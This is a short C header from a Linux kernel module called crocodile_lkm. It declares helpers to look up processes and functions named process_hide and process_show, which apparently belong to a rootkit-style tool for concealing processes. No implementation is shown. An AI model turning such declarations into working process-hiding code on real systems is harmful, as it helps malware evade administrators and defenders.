/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef _CROCODILE_LKM_PROC_PROC_H_
#define _CROCODILE_LKM_PROC_PROC_H_

#include <linux/types.h>

/* Forward declaration of the system structure. */
struct pid;

/* Forward declaration of the system structure. */
struct task_struct;

struct pid* find_pid(pid_t nr);

struct task_struct* find_process(pid_t pid);

long process_hide(pid_t pid);
long process_show(pid_t pid);

#endif /* _CROCODILE_LKM_PROC_PROC_H_ */
